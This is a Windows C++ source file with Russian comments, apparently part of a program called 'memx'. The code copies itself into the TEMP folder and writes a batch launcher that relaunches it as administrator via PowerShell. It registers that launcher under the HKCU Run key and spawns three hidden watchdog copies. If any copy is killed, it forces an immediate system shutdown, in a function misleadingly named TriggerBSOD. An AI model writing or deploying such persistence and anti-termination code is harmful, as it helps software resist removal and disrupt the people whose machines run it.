#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <fstream>

extern volatile bool g_running;

// ====== ПОЛУЧИТЬ ПРОЦЕССЫ ПО ИМЕНИ ======
std::vector<DWORD> GetProcessesByName(const std::wstring& name) {
    std::vector<DWORD> pids;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return pids;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (name == pe.szExeFile) {
                pids.push_back(pe.th32ProcessID);
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pids;
}

// ====== TRIGGER BSOD ======
void TriggerBSOD() {
    system("shutdown /s /t 0");
}

// ====== WATCHDOG ПРОЦЕСС ======
DWORD WINAPI WatchdogProcess(LPVOID param) {
    const wchar_t* target = L"memx.exe";

    while (g_running) {
        auto pids = GetProcessesByName(target);
        if (pids.size() < 3) {
            TriggerBSOD();
            break;
        }
        Sleep(1000);
    }
    return 0;
}

// ====== СОЗДАТЬ ДОЧЕРНИЙ WATCHDOG ======
void CreateWatchdogChild(const std::wstring& exePath) {
    STARTUPINFOW si = {sizeof(STARTUPINFOW)};
    PROCESS_INFORMATION pi;

    std::wstring cmd = L"\"" + exePath + L"\" /watchdog";
    CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

// ====== ПРОВЕРКА, ЕСТЬ ЛИ ФАЙЛЫ ======
bool AreFilesInstalled() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string tempDir = std::string(tempPath) + "MEMX\\";
    std::string tempExe = tempDir + "memx.exe";
    std::string batPath = tempDir + "memx_launcher.bat";
    
    // Проверяем, что оба файла существуют
    bool exeExists = (GetFileAttributesA(tempExe.c_str()) != INVALID_FILE_ATTRIBUTES);
    bool batExists = (GetFileAttributesA(batPath.c_str()) != INVALID_FILE_ATTRIBUTES);
    
    return exeExists && batExists;
}

// ====== ПРОВЕРКА, ЕСТЬ ЛИ КЛЮЧ В РЕЕСТРЕ ======
bool IsRegistryKeyExists() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        char value[1024] = {0};
        DWORD size = sizeof(value);
        DWORD type = 0;
        LONG result = RegQueryValueExA(hKey, "MEMX_Launcher", NULL, &type, (BYTE*)value, &size);
        RegCloseKey(hKey);
        
        return (result == ERROR_SUCCESS);
    }
    return false;
}

// ====== КОПИРОВАНИЕ В TEMP И ДОБАВЛЕНИЕ В АВТОЗАГРУЗКУ ======
void InstallToStartup() {
    // 1. Получаем путь к TEMP
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string tempDir = std::string(tempPath) + "MEMX\\";
    
    // 2. Создаём папку в TEMP (если нет)
    CreateDirectoryA(tempDir.c_str(), NULL);
    
    // 3. Копируем себя в TEMP (если ещё нет)
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string tempExe = tempDir + "memx.exe";
    
    if (GetFileAttributesA(tempExe.c_str()) == INVALID_FILE_ATTRIBUTES) {
        CopyFileA(exePath, tempExe.c_str(), FALSE);
    }
    
    // 4. Создаём батник (если ещё нет)
    std::string batPath = tempDir + "memx_launcher.bat";
    if (GetFileAttributesA(batPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        std::ofstream bat(batPath);
        if (bat.is_open()) {
            bat << "@echo off\n";
            bat << "title MEMX Launcher\n";
            bat << "cd /d \"" << tempDir << "\"\n";
            bat << "\n";
            bat << ":: Проверяем, запущен ли уже MEMX\n";
            bat << "tasklist /FI \"IMAGENAME eq memx.exe\" 2>NUL | find /I /N \"memx.exe\" >NUL\n";
            bat << "if \"%ERRORLEVEL%\"==\"0\" (\n";
            bat << "    exit\n";
            bat << ")\n";
            bat << "\n";
            bat << ":: Запускаем от админа через PowerShell\n";
            bat << "powershell -Command \"Start-Process '\"" << tempExe << "\"' -Verb RunAs\"\n";
            bat << "exit\n";
            bat.close();
        }
    }
    
    // 5. Добавляем батник в автозагрузку (если ещё нет)
    if (!IsRegistryKeyExists()) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, 
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            
            std::string regValue = "\"" + batPath + "\"";
            RegSetValueExA(hKey, "MEMX_Launcher", 0, REG_SZ, 
                (BYTE*)regValue.c_str(), regValue.length() + 1);
            RegCloseKey(hKey);
        }
    }
}

// ====== ЗАПУСК WATCHDOG ======
void StartWatchdog() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);

    // 1. Запускаем 3 дочерних процесса
    for (int i = 0; i < 3; i++) {
        CreateWatchdogChild(path);
    }

    // 2. Запускаем watchdog-поток
    CreateThread(NULL, 0, WatchdogProcess, (LPVOID)1, 0, NULL);
    
    // 3. Проверяем, всё ли на месте
    bool filesExist = AreFilesInstalled();
    bool regExists = IsRegistryKeyExists();
    
    // 4. Если чего-то нет — устанавливаем
    if (!filesExist || !regExists) {
        InstallToStartup();
    }
}